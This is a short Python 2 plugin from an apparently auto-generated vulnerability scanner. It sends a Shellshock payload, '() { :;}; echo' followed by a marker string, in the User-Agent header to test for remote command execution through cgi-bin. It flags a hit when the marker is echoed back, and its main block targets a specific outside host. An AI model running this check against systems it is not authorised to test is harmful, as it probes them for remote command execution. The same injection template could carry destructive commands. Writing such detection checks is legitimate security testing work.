from ..miniCurl import Curl
from ..t  import T
# -*- coding: cp936 -*-
"""
scanner - Network scanner.
Author : Tommy.
"""
__version__ = '1.0'


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = '''() { :;}; echo d5f4f931d08210b1ed6e98d26b6318b6:'''
        code, head, res, errcode, _ = curl.curl('-A "%s" %s' %(payload,arg))
        if code == 200 and 'd5f4f931d08210b1ed6e98d26b6318b6' in head+res:
            output(arg,result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  cgi-bin  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='command exploit Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/www/www_e81d76bdbfb7aeddf62543f7b91e0139.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__=="__main__":
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_e81d76bdbfb7aeddf62543f7b91e0139.py
#/root/github/poccreate/codesrc/exp-139.py